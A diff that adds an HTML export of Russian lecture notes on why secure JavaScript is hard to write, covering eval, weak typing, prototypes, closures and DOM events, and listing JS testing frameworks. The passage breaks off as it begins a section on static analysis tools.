@@ -1,0 +1,2056 @@
+<html>
+
+<head>
+	<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+	<title>Материал лекции</title>
+	<style>
+		/* cspell:disable-file */
+		/* webkit printing magic: print all background colors */
+		html {
+			-webkit-print-color-adjust: exact;
+		}
+
+		* {
+			box-sizing: border-box;
+			-webkit-print-color-adjust: exact;
+		}
+
+		html,
+		body {
+			margin: 0;
+			padding: 0;
+		}
+
+		@media only screen {
+			body {
+				margin: 2em auto;
+				max-width: 900px;
+				color: rgb(55, 53, 47);
+			}
+		}
+
+		body {
+			line-height: 1.5;
+			/* white-space: pre-wrap; */
+		}
+
+		a,
+		a.visited {
+			color: inherit;
+			text-decoration: underline;
+		}
+
+		.pdf-relative-link-path {
+			font-size: 80%;
+			color: #444;
+		}
+
+		h1,
+		h2,
+		h3 {
+			letter-spacing: -0.01em;
+			line-height: 1.2;
+			font-weight: 600;
+			margin-bottom: 0;
+		}
+
+		.page-title {
+			font-size: 2.5rem;
+			font-weight: 700;
+			margin-top: 0;
+			margin-bottom: 0.75em;
+		}
+
+		h1 {
+			font-size: 1.875rem;
+			margin-top: 1.875rem;
+		}
+
+		h2 {
+			font-size: 1.5rem;
+			margin-top: 1.5rem;
+		}
+
+		h3 {
+			font-size: 1.25rem;
+			margin-top: 1.25rem;
+		}
+
+		.source {
+			border: 1px solid #ddd;
+			border-radius: 3px;
+			padding: 1.5em;
+			word-break: break-all;
+		}
+
+		.callout {
+			border-radius: 3px;
+			padding: 1rem;
+		}
+
+		figure {
+			margin: 1.25em 0;
+			page-break-inside: avoid;
+		}
+
+		figcaption {
+			opacity: 0.5;
+			font-size: 85%;
+			margin-top: 0.5em;
+		}
+
+		mark {
+			background-color: transparent;
+		}
+
+		.indented {
+			padding-left: 1.5em;
+		}
+
+		hr {
+			background: transparent;
+			display: block;
+			width: 100%;
+			height: 1px;
+			visibility: visible;
+			border: none;
+			border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+		}
+
+		img {
+			max-width: 100%;
+		}
+
+		@media only print {
+			img {
+				max-height: 100vh;
+				object-fit: contain;
+			}
+		}
+
+		@page {
+			margin: 1in;
+		}
+
+		.collection-content {
+			font-size: 0.875rem;
+		}
+
+		.column-list {
+			display: flex;
+			justify-content: space-between;
+		}
+
+		.column {
+			padding: 0 1em;
+		}
+
+		.column:first-child {
+			padding-left: 0;
+		}
+
+		.column:last-child {
+			padding-right: 0;
+		}
+
+		.table_of_contents-item {
+			display: block;
+			font-size: 0.875rem;
+			line-height: 1.3;
+			padding: 0.125rem;
+		}
+
+		.table_of_contents-indent-1 {
+			margin-left: 1.5rem;
+		}
+
+		.table_of_contents-indent-2 {
+			margin-left: 3rem;
+		}
+
+		.table_of_contents-indent-3 {
+			margin-left: 4.5rem;
+		}
+
+		.table_of_contents-link {
+			text-decoration: none;
+			opacity: 0.7;
+			border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+		}
+
+		table,
+		th,
+		td {
+			border: 1px solid rgba(55, 53, 47, 0.09);
+			border-collapse: collapse;
+		}
+
+		table {
+			border-left: none;
+			border-right: none;
+		}
+
+		th,
+		td {
+			font-weight: normal;
+			padding: 0.25em 0.5em;
+			line-height: 1.5;
+			min-height: 1.5em;
+			text-align: left;
+		}
+
+		th {
+			color: rgba(55, 53, 47, 0.6);
+		}
+
+		ol,
+		ul {
+			margin: 0;
+			margin-block-start: 0.6em;
+			margin-block-end: 0.6em;
+		}
+
+		li>ol:first-child,
+		li>ul:first-child {
+			margin-block-start: 0.6em;
+		}
+
+		ul>li {
+			list-style: disc;
+		}
+
+		ul.to-do-list {
+			padding-inline-start: 0;
+		}
+
+		ul.to-do-list>li {
+			list-style: none;
+		}
+
+		.to-do-children-checked {
+			text-decoration: line-through;
+			opacity: 0.375;
+		}
+
+		ul.toggle>li {
+			list-style: none;
+		}
+
+		ul {
+			padding-inline-start: 1.7em;
+		}
+
+		ul>li {
+			padding-left: 0.1em;
+		}
+
+		ol {
+			padding-inline-start: 1.6em;
+		}
+
+		ol>li {
+			padding-left: 0.2em;
+		}
+
+		.mono ol {
+			padding-inline-start: 2em;
+		}
+
+		.mono ol>li {
+			text-indent: -0.4em;
+		}
+
+		.toggle {
+			padding-inline-start: 0em;
+			list-style-type: none;
+		}
+
+		/* Indent toggle children */
+		.toggle>li>details {
+			padding-left: 1.7em;
+		}
+
+		.toggle>li>details>summary {
+			margin-left: -1.1em;
+		}
+
+		.selected-value {
+			display: inline-block;
+			padding: 0 0.5em;
+			background: rgba(206, 205, 202, 0.5);
+			border-radius: 3px;
+			margin-right: 0.5em;
+			margin-top: 0.3em;
+			margin-bottom: 0.3em;
+			white-space: nowrap;
+		}
+
+		.collection-title {
+			display: inline-block;
+			margin-right: 1em;
+		}
+
+		.page-description {
+			margin-bottom: 2em;
+		}
+
+		.simple-table {
+			margin-top: 1em;
+			font-size: 0.875rem;
+			empty-cells: show;
+		}
+
+		.simple-table td {
+			height: 29px;
+			min-width: 120px;
+		}
+
+		.simple-table th {
+			height: 29px;
+			min-width: 120px;
+		}
+
+		.simple-table-header-color {
+			background: rgb(247, 246, 243);
+			color: black;
+		}
+
+		.simple-table-header {
+			font-weight: 500;
+		}
+
+		time {
+			opacity: 0.5;
+		}
+
+		.icon {
+			display: inline-block;
+			max-width: 1.2em;
+			max-height: 1.2em;
+			text-decoration: none;
+			vertical-align: text-bottom;
+			margin-right: 0.5em;
+		}
+
+		img.icon {
+			border-radius: 3px;
+		}
+
+		.user-icon {
+			width: 1.5em;
+			height: 1.5em;
+			border-radius: 100%;
+			margin-right: 0.5rem;
+		}
+
+		.user-icon-inner {
+			font-size: 0.8em;
+		}
+
+		.text-icon {
+			border: 1px solid #000;
+			text-align: center;
+		}
+
+		.page-cover-image {
+			display: block;
+			object-fit: cover;
+			width: 100%;
+			max-height: 30vh;
+		}
+
+		.page-header-icon {
+			font-size: 3rem;
+			margin-bottom: 1rem;
+		}
+
+		.page-header-icon-with-cover {
+			margin-top: -0.72em;
+			margin-left: 0.07em;
+		}
+
+		.page-header-icon img {
+			border-radius: 3px;
+		}
+
+		.link-to-page {
+			margin: 1em 0;
+			padding: 0;
+			border: none;
+			font-weight: 500;
+		}
+
+		p>.user {
+			opacity: 0.5;
+		}
+
+		td>.user,
+		td>time {
+			white-space: nowrap;
+		}
+
+		input[type="checkbox"] {
+			transform: scale(1.5);
+			margin-right: 0.6em;
+			vertical-align: middle;
+		}
+
+		p {
+			margin-top: 0.5em;
+			margin-bottom: 0.5em;
+		}
+
+		.image {
+			border: none;
+			margin: 1.5em 0;
+			padding: 0;
+			border-radius: 0;
+			text-align: center;
+		}
+
+		.code,
+		code {
+			background: rgba(135, 131, 120, 0.15);
+			border-radius: 3px;
+			padding: 0.2em 0.4em;
+			border-radius: 3px;
+			font-size: 85%;
+			tab-size: 2;
+		}
+
+		code {
+			color: #eb5757;
+		}
+
+		.code {
+			padding: 1.5em 1em;
+		}
+
+		.code-wrap {
+			white-space: pre-wrap;
+			word-break: break-all;
+		}
+
+		.code>code {
+			background: none;
+			padding: 0;
+			font-size: 100%;
+			color: inherit;
+		}
+
+		blockquote {
+			font-size: 1.25em;
+			margin: 1em 0;
+			padding-left: 1em;
+			border-left: 3px solid rgb(55, 53, 47);
+		}
+
+		.bookmark {
+			text-decoration: none;
+			max-height: 8em;
+			padding: 0;
+			display: flex;
+			width: 100%;
+			align-items: stretch;
+		}
+
+		.bookmark-title {
+			font-size: 0.85em;
+			overflow: hidden;
+			text-overflow: ellipsis;
+			height: 1.75em;
+			white-space: nowrap;
+		}
+
+		.bookmark-text {
+			display: flex;
+			flex-direction: column;
+		}
+
+		.bookmark-info {
+			flex: 4 1 180px;
+			padding: 12px 14px 14px;
+			display: flex;
+			flex-direction: column;
+			justify-content: space-between;
+		}
+
+		.bookmark-image {
+			width: 33%;
+			flex: 1 1 180px;
+			display: block;
+			position: relative;
+			object-fit: cover;
+			border-radius: 1px;
+		}
+
+		.bookmark-description {
+			color: rgba(55, 53, 47, 0.6);
+			font-size: 0.75em;
+			overflow: hidden;
+			max-height: 4.5em;
+			word-break: break-word;
+		}
+
+		.bookmark-href {
+			font-size: 0.75em;
+			margin-top: 0.25em;
+		}
+
+		.sans {
+			font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol";
+		}
+
+		.code {
+			font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace;
+		}
+
+		.serif {
+			font-family: Lyon-Text, Georgia, ui-serif, serif;
+		}
+
+		.mono {
+			font-family: iawriter-mono, Nitti, Menlo, Courier, monospace;
+		}
+
+		.pdf .sans {
+			font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP';
+		}
+
+		.pdf:lang(zh-CN) .sans {
+			font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC';
+		}
+
+		.pdf:lang(zh-TW) .sans {
+			font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC';
+		}
+
+		.pdf:lang(ko-KR) .sans {
+			font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR';
+		}
+
+		.pdf .code {
+			font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP';
+		}
+
+		.pdf:lang(zh-CN) .code {
+			font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC';
+		}
+
+		.pdf:lang(zh-TW) .code {
+			font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC';
+		}
+
+		.pdf:lang(ko-KR) .code {
+			font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR';
+		}
+
+		.pdf .serif {
+			font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP';
+		}
+
+		.pdf:lang(zh-CN) .serif {
+			font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC';
+		}
+
+		.pdf:lang(zh-TW) .serif {
+			font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC';
+		}
+
+		.pdf:lang(ko-KR) .serif {
+			font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR';
+		}
+
+		.pdf .mono {
+			font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP';
+		}
+
+		.pdf:lang(zh-CN) .mono {
+			font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC';
+		}
+
+		.pdf:lang(zh-TW) .mono {
+			font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC';
+		}
+
+		.pdf:lang(ko-KR) .mono {
+			font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR';
+		}
+
+		.highlight-default {
+			color: rgba(55, 53, 47, 1);
+		}
+
+		.highlight-gray {
+			color: rgba(120, 119, 116, 1);
+			fill: rgba(120, 119, 116, 1);
+		}
+
+		.highlight-brown {
+			color: rgba(159, 107, 83, 1);
+			fill: rgba(159, 107, 83, 1);
+		}
+
+		.highlight-orange {
+			color: rgba(217, 115, 13, 1);
+			fill: rgba(217, 115, 13, 1);
+		}
+
+		.highlight-yellow {
+			color: rgba(203, 145, 47, 1);
+			fill: rgba(203, 145, 47, 1);
+		}
+
+		.highlight-teal {
+			color: rgba(68, 131, 97, 1);
+			fill: rgba(68, 131, 97, 1);
+		}
+
+		.highlight-blue {
+			color: rgba(51, 126, 169, 1);
+			fill: rgba(51, 126, 169, 1);
+		}
+
+		.highlight-purple {
+			color: rgba(144, 101, 176, 1);
+			fill: rgba(144, 101, 176, 1);
+		}
+
+		.highlight-pink {
+			color: rgba(193, 76, 138, 1);
+			fill: rgba(193, 76, 138, 1);
+		}
+
+		.highlight-red {
+			color: rgba(212, 76, 71, 1);
+			fill: rgba(212, 76, 71, 1);
+		}
+
+		.highlight-default_background {
+			color: rgba(55, 53, 47, 1);
+		}
+
+		.highlight-gray_background {
+			background: rgba(241, 241, 239, 1);
+		}
+
+		.highlight-brown_background {
+			background: rgba(244, 238, 238, 1);
+		}
+
+		.highlight-orange_background {
+			background: rgba(251, 236, 221, 1);
+		}
+
+		.highlight-yellow_background {
+			background: rgba(251, 237, 214, 1);
+		}
+
+		.highlight-teal_background {
+			background: rgba(237, 243, 236, 1);
+		}
+
+		.highlight-blue_background {
+			background: rgba(231, 243, 248, 1);
+		}
+
+		.highlight-purple_background {
+			background: rgba(244, 240, 247, 0.8);
+		}
+
+		.highlight-pink_background {
+			background: rgba(249, 238, 243, 0.8);
+		}
+
+		.highlight-red_background {
+			background: rgba(253, 235, 236, 1);
+		}
+
+		.block-color-default {
+			color: inherit;
+			fill: inherit;
+		}
+
+		.block-color-gray {
+			color: rgba(120, 119, 116, 1);
+			fill: rgba(120, 119, 116, 1);
+		}
+
+		.block-color-brown {
+			color: rgba(159, 107, 83, 1);
+			fill: rgba(159, 107, 83, 1);
+		}
+
+		.block-color-orange {
+			color: rgba(217, 115, 13, 1);
+			fill: rgba(217, 115, 13, 1);
+		}
+
+		.block-color-yellow {
+			color: rgba(203, 145, 47, 1);
+			fill: rgba(203, 145, 47, 1);
+		}
+
+		.block-color-teal {
+			color: rgba(68, 131, 97, 1);
+			fill: rgba(68, 131, 97, 1);
+		}
+
+		.block-color-blue {
+			color: rgba(51, 126, 169, 1);
+			fill: rgba(51, 126, 169, 1);
+		}
+
+		.block-color-purple {
+			color: rgba(144, 101, 176, 1);
+			fill: rgba(144, 101, 176, 1);
+		}
+
+		.block-color-pink {
+			color: rgba(193, 76, 138, 1);
+			fill: rgba(193, 76, 138, 1);
+		}
+
+		.block-color-red {
+			color: rgba(212, 76, 71, 1);
+			fill: rgba(212, 76, 71, 1);
+		}
+
+		.block-color-default_background {
+			color: inherit;
+			fill: inherit;
+		}
+
+		.block-color-gray_background {
+			background: rgba(241, 241, 239, 1);
+		}
+
+		.block-color-brown_background {
+			background: rgba(244, 238, 238, 1);
+		}
+
+		.block-color-orange_background {
+			background: rgba(251, 236, 221, 1);
+		}
+
+		.block-color-yellow_background {
+			background: rgba(251, 237, 214, 1);
+		}
+
+		.block-color-teal_background {
+			background: rgba(237, 243, 236, 1);
+		}
+
+		.block-color-blue_background {
+			background: rgba(231, 243, 248, 1);
+		}
+
+		.block-color-purple_background {
+			background: rgba(244, 240, 247, 0.8);
+		}
+
+		.block-color-pink_background {
+			background: rgba(249, 238, 243, 0.8);
+		}
+
+		.block-color-red_background {
+			background: rgba(253, 235, 236, 1);
+		}
+
+		.select-value-color-uiBlue {
+			background-color: rgba(35, 131, 226, .07);
+		}
+
+		.select-value-color-pink {
+			background-color: rgba(245, 224, 233, 1);
+		}
+
+		.select-value-color-purple {
+			background-color: rgba(232, 222, 238, 1);
+		}
+
+		.select-value-color-green {
+			background-color: rgba(219, 237, 219, 1);
+		}
+
+		.select-value-color-gray {
+			background-color: rgba(227, 226, 224, 1);
+		}
+
+		.select-value-color-transparentGray {
+			background-color: rgba(227, 226, 224, 0);
+		}
+
+		.select-value-color-translucentGray {
+			background-color: rgba(0, 0, 0, 0.06);
+		}
+
+		.select-value-color-orange {
+			background-color: rgba(250, 222, 201, 1);
+		}
+
+		.select-value-color-brown {
+			background-color: rgba(238, 224, 218, 1);
+		}
+
+		.select-value-color-red {
+			background-color: rgba(255, 226, 221, 1);
+		}
+
+		.select-value-color-yellow {
+			background-color: rgba(249, 228, 188, 1);
+		}
+
+		.select-value-color-blue {
+			background-color: rgba(211, 229, 239, 1);
+		}
+
+		.select-value-color-pageGlass {
+			background-color: undefined;
+		}
+
+		.select-value-color-washGlass {
+			background-color: undefined;
+		}
+
+		.checkbox {
+			display: inline-flex;
+			vertical-align: text-bottom;
+			width: 16;
+			height: 16;
+			background-size: 16px;
+			margin-left: 2px;
+			margin-right: 5px;
+		}
+
+		.checkbox-on {
+			background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+		}
+
+		.checkbox-off {
+			background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+		}
+	</style>
+</head>
+
+<body>
+	<article id="6730a7e9-02a5-4e9c-9fa5-e01c23947b51" class="page sans">
+		<header>
+			<h1 class="page-title">Материал лекции</h1>
+			<p class="page-description"></p>
+		</header>
+		<div class="page-body">
+			<p id="1ef32319-ee20-4a4e-9a2e-303893211574" class="">
+			</p>
+			<h1 id="adbc8cdb-eb62-4f54-91d5-fd268113a94f" class="">Вопросы безопасности JS</h1>
+			<p id="f832f01b-fdfb-493e-8f03-62864d7a34f0" class="">Разработка безопасных приложений на JavaScript —
+				довольно непросто. Рассмотрим причины почему сложно писать безопасный код на JS.</p>
+			<h3 id="43e67b8d-8a75-4c15-8ea8-7577cf252446" class=""><strong>Компилятор не поможет</strong></h3>
+			<p id="31288778-76c6-493f-8682-5facd203f1a3" class="">JavaScript — интерпретируемый язык. А это значит, что
+				компилятор не будет все время на что-нибудь жаловаться, отказываясь работать и подталкивая тебя
+				поправить ошибки и оптимизировать код.</p>
+			<h3 id="cef3b870-1ec0-4500-be97-b9747e29699e" class=""><strong>Динамическая суть JavaScript</strong></h3>
+			<p id="d930fa50-5a56-491b-b833-007ab508aa37" class="">JavaScript динамический, слаботипизированный и
+				асинхронный. А это все признаки того, что попасть в беду легче легкого.</p>
+			<ol type="1" id="8726ed63-910f-4317-a112-44f4c9228f8b" class="numbered-list" start="1">
+				<li><strong>Языковые средства вроде eval</strong> и включения стороннего кода через script src позволяют
+					исполнять строки прямо в рантайме. Как следствие — сложно дать «статические гарантии» того, что код
+					будет вести себя определенным образом. Динамический анализ это тоже затрудняет (см. <a
+						href="https://dl.acm.org/citation.cfm?id=2032503">научную работу</a>).</li>
+			</ol>
+			<ol type="1" id="5ae2fd16-d613-4191-9b71-5cb4ed868ed7" class="numbered-list" start="2">
+				<li><strong>Слабая типизация</strong> приводит к тому, что применять устоявшиеся методы статического
+					анализа непросто — по крайней мере в сравнении со статически типизированными языками (например,
+					Java).</li>
+			</ol>
+			<ol type="1" id="27466a86-4da0-4e7c-b81d-d8d80b4dd9ad" class="numbered-list" start="3">
+				<li><strong>Асинхронные колбэки,</strong> вызовы которых JavaScript допускает через механизмы вроде
+					setTimeout и XMLHttpRequest (тот самый знаменитый AJAX), по статистике прячут в себе больше всего
+					коварных ошибок.</li>
+			</ol>
+			<h3 id="2d38fdf8-d10a-4289-b919-bdaf430f0b8d" class=""><strong>Замысловатые возможности JS</strong></h3>
+			<p id="441e3263-c443-4ced-80e5-46533ce4d273" class="">Чего только не притащили в JavaScript с годами! В
+				частности, в нем есть прототипы, функции первого класса и замыкания. Они делают язык еще динамичнее, а
+				написание безопасного кода — сложнее.</p>
+			<ol type="1" id="3421d713-bc35-41f3-bf1e-d08dcb618d63" class="numbered-list" start="1">
+				<li><strong>Прототипы.</strong> Смысл их в том, что программы пишутся в духе объектно ориентированного
+					подхода, но без использования классов. При таком подходе объекты наследуют необходимые им свойства
+					напрямую от других объектов (прототипов). При этом в JS прототипы могут быть переопределены прямо в
+					рантайме. И если это переопределение случилось, то эффект сразу же распространяется на все объекты,
+					которые наследуют свойства переопределяемого прототипа.<br />Справедливости ради надо сказать, что в
+					новых спецификациях ECMAScript классы тоже присутствуют.<br />
+					<figure id="a1c20858-2e5a-430c-aab9-28ba8167a0b3" class="image"><a
+							href="%D0%9C%D0%B0%D1%82%D0%B5%D1%80%D0%B8%D0%B0%D0%BB%20%D0%BB%D0%B5%D0%BA%D1%86%D0%B8%D0%B8%206730a7e902a54e9c9fa5e01c23947b51/Untitled.png"><img
+								style="width:960px"
+								src="%D0%9C%D0%B0%D1%82%D0%B5%D1%80%D0%B8%D0%B0%D0%BB%20%D0%BB%D0%B5%D0%BA%D1%86%D0%B8%D0%B8%206730a7e902a54e9c9fa5e01c23947b51/Untitled.png" /></a>
+					</figure>
+				</li>
+			</ol>
+			<ol type="1" id="a16bc4d6-c77b-439a-a61c-a631e371505a" class="numbered-list" start="2">
+				<li><strong>Функции первого класса.</strong> У JS очень гибкая модель объектов и функций. Свойства
+					объектов и их значения могут быть созданы, изменены или удалены прямо в рантайме, и ко всем есть
+					доступ через функции первого класса.</li>
+			</ol>
+			<ol type="1" id="10aadff9-aca4-4986-991a-bfd80b7d17a4" class="numbered-list" start="3">
+				<li><strong>Замыкания.</strong> Если объявить функцию внутри другой функции, то первая получает доступ к
+					переменным и аргументам последней. Причем эти переменные продолжают существовать и остаются
+					доступными внутренней функции — даже после того, как внешняя функция, в которой эти переменные
+					определены, завершилась.</li>
+			</ol>
+			<p id="26ee51c8-2e06-4034-a616-42f32d0ea9ce" class="">Из-за такой гибкости и динамичности JavaScript (см.
+				пункты 1 и 3) определение набора всех доступных свойств объекта при статическом анализе — неразрешимая
+				задача. Однако веб-разработчики повсеместно используют динамические особенности языка, а соответственно,
+				пренебрегать ими при анализе кода нельзя. Иначе какая тут гарантия безопасности?</p>
+			<h3 id="c0dc2bff-5036-402a-bed4-89de8cf99ed0" class=""><strong>Тесное взаимодействие между JavaScript и
+					DOM</strong></h3>
+			<p id="8cd8234a-df62-4246-baa1-f273d16c4e00" class="">Это нужно, чтобы обеспечить «бесшовное» обновление
+				веб-страницы, прямо в рантайме. DOM, как известно, представляет собой стандартную объектную модель,
+				нейтральную по отношению к платформам и языкам, которая предназначена для отрисовки документов HTML и
+				XML. У DOM есть собственный API для работы с отображаемым документом: для динамического доступа,
+				перемещения и обновления отображаемого документа (его содержимого, структуры и стиля). Изменения в DOM
+				могут вноситься динамически, через JavaScript. И эти изменения сразу же отображаются в браузере.</p>
+			<p id="6aa5f632-e261-4036-a75a-88193cf1df74" class="">Благодаря DOM загруженные в браузер веб-страницы можно
+				обновлять поэтапно по ходу подгрузки данных с сервера. Однако у такого удобства есть и оборотная
+				сторона: фрагменты кода, которые отвечают за динамическое взаимодействие между JS и DOM, особенно
+				подвержены ошибкам.</p>
+			<figure id="1e11eb64-e9a6-4961-98d6-63a8c1a397d7" class="image"><a
+					href="%D0%9C%D0%B0%D1%82%D0%B5%D1%80%D0%B8%D0%B0%D0%BB%20%D0%BB%D0%B5%D0%BA%D1%86%D0%B8%D0%B8%206730a7e902a54e9c9fa5e01c23947b51/Untitled%201.png"><img
+						style="width:576px"
+						src="%D0%9C%D0%B0%D1%82%D0%B5%D1%80%D0%B8%D0%B0%D0%BB%20%D0%BB%D0%B5%D0%BA%D1%86%D0%B8%D0%B8%206730a7e902a54e9c9fa5e01c23947b51/Untitled%201.png" /></a>
+			</figure>
+			<h3 id="bb6ad6cd-c12c-4a15-8b91-809137c2020a" class=""><strong>Сложные событийные взаимодействия</strong>
+			</h3>
+			<p id="8aa2c736-558e-4720-ba23-045c049e0e6b" class="">JavaScript — это язык, управляемый событиями
+				(event-driven). Он позволяет разработчикам регистрировать на узлах DOM так называемых «слушателей
+				событий» — event listeners. И хотя большинство событий вызываются действиями пользователя, существуют и
+				такие, которые могут быть инициированы и без этого, — например, события по времени и асинхронные вызовы.
+				При этом каждое событие может отдаваться эхом по всему дереву DOM и активировать сразу несколько
+				«слушателей». Иногда отследить все это — довольно нетривиальная задача.</p>
+			<figure id="d2db7c4c-d706-4602-8968-955ff70aee81" class="image"><a
+					href="%D0%9C%D0%B0%D1%82%D0%B5%D1%80%D0%B8%D0%B0%D0%BB%20%D0%BB%D0%B5%D0%BA%D1%86%D0%B8%D0%B8%206730a7e902a54e9c9fa5e01c23947b51/Untitled%202.png"><img
+						style="width:480px"
+						src="%D0%9C%D0%B0%D1%82%D0%B5%D1%80%D0%B8%D0%B0%D0%BB%20%D0%BB%D0%B5%D0%BA%D1%86%D0%B8%D0%B8%206730a7e902a54e9c9fa5e01c23947b51/Untitled%202.png" /></a>
+			</figure>
+			<p id="b3403dbc-d108-45f5-8abc-311134084e87" class="">По этим причинам код на JS может быть труден для
+				понимания, анализа и тестирования.</p>
+			<h2 id="d3f871e8-3fce-49e5-8464-00e933a2c113" class=""><strong>Утилиты для тестирования кода на JS</strong>
+			</h2>
+			<p id="b7427436-6011-43c1-a9c2-92d834f0a8ca" class="">Существуют утилиты для парсинга
+				(например, Esprima, Rhino), оптимизации (например, Google Closure Compiler) и статического анализа кода
+				на наличие распространенных синтаксических ошибок (например, JSHint).</p>
+			<p id="106ae0ee-25ca-4892-8e4c-d3dec00842a1" class="">Кроме того, есть несколько проверенных фреймворков,
+				которые помогают веб-разработчикам покрывать JS-код тестами. Среди них:</p>
+			<ul id="ecaa4c5a-cd8f-4fa3-b005-1f2cd7bcb25c" class="bulleted-list">
+				<li style="list-style-type:disc"><strong><a
+							href="https://www.npmjs.com/package/qunit">QUnit</a></strong><a
+						href="https://www.npmjs.com/package/qunit"> </a>— популярный фреймворк для тестирования модулей;
+				</li>
+			</ul>
+			<ul id="a49f0a3b-ac2a-41d1-9c73-3470eac2b3e4" class="bulleted-list">
+				<li style="list-style-type:disc"><strong><a href="https://jasmine.github.io/">Jasmine</a></strong><a
+						href="https://jasmine.github.io/"> </a>— BDD-фреймворк (Behavior-driven Development) для
+					тестирования кода;</li>
+			</ul>
+			<ul id="75740696-cfb2-4bde-b126-9b2f22795893" class="bulleted-list">
+				<li style="list-style-type:disc"><strong><a href="https://mochajs.org/">Mocha</a></strong><a
+						href="https://mochajs.org/"> </a>— фреймворк для тестирования кода, запускается как в Node.js,
+					так и в браузере;</li>
+			</ul>
+			<ul id="eac9b1e0-e0b5-4b9b-98d3-d2fa685d5644" class="bulleted-list">
+				<li style="list-style-type:disc"><strong><a
+							href="https://www.jetbrains.com/help/webstorm/running-tests-on-jstestdriver.html">jsTestDriver</a></strong><a
+						href="https://www.jetbrains.com/help/webstorm/running-tests-on-jstestdriver.html"> </a>—
+					фреймворк, который в числе прочего может прогонять набор тестов сразу через несколько браузеров.
+				</li>
+			</ul>
+			<p id="a07cd537-aac8-4590-b569-9117e7f4e818" class="">Кроме того, существуют тестирующие фреймворки, которые
+				эмулируют поведение браузера и позволяют автоматически прогонять тестовые примеры. Они особенно
+				актуальны при отладке участков кода, которые отвечают за взаимодействие между JS и DOM, и предоставляют
+				удобную инфраструктуру для манипулирования DOM.</p>
+			<p id="0e6e645b-d384-48f8-ad68-14810d964335" class="">К
+				примеру, Selenium, PhantomJS и SlimerJS предоставляют API, через который можно запускать экземпляры
+				браузера и работать с ними. Через API ты можешь активировать события и получать доступ к элементам DOM
+				прямо в рантайме — то есть тестировать код в условиях, максимально приближенных к реальным. Конечно,
+				немалую часть работы придется проделывать вручную, но даже это уже неплохая помощь в тестировании.</p>
+			<h2 id="b009a705-e952-4d9c-8001-440914f01b70" class=""><strong>Утилиты для статического анализа</strong>
+			</h2>
+			<p id="c9a93e2b-f631-4c7b-a91b-e105f969c7b7" class="">Ранее утилиты для выявления проблемных участков кода
+				представляли собой статические анализаторы. То есть, учитывая все динамические причуды JS, могли
+				предоставить только ограниченную помощь. Однако и они бывают полезными в анализе. Вот несколько основных
